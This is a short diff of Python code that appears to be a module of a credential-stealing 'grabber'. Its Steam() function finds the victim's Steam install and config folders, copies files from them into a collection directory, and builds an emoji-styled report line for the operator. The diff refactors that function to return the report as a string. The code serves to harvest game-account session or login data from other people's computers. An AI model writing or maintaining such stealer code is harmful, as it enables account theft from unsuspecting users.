@@ -19,9 +19,10 @@ path02 = r'C:\Program Files\Steam\config'
 path3 = r'C:\Program Files (x86)\Steam'
 path03 = r'C:\Program Files (x86)\Steam\config'
 
-def Steam(data):
+def Steam():
     try:
-        data.append("\n\n**🕹Games🕹**")
+        msgInfo = ""
+        msgInfo+="\n\n**🕹Games🕹**"
         Log("===========Games===========")
         try:
             pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
@@ -42,9 +43,9 @@ def Steam(data):
             copy(path3+'\\'+files3[1], directory2)
         except Exception as error:
             Log(f"Steam(x86) ---> {error}")
-        data.append("\n∟🎮Steam")
-        return data
+        msgInfo+="\n∟🎮Steam"
+        return msgInfo
     except Exception as error:
         Log(f"Steam(global) ---> {error}")
-        return data
+        return msgInfo
 
